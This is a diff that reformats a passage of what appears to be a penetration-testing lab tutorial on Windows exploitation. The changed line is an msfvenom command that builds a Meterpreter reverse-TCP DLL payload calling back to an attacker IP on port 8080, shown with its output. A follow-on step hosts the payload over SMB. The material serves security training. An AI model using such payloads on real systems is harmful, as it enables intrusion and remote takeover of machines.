@@ -33,8 +33,12 @@ After confirming this, we can proceed with attempting to use the exploit. We can
 
 #### Generating a DLL Payload
 
- ```0xxNosystemisSafe@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of dll file: 8704 bytes
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of dll file: 8704 bytes
 ```
+
+
+
 We will then host this payload in an SMB share we create on our attack host using `smbserver.py`.
 
 #### Creating a Share with smbserver.py
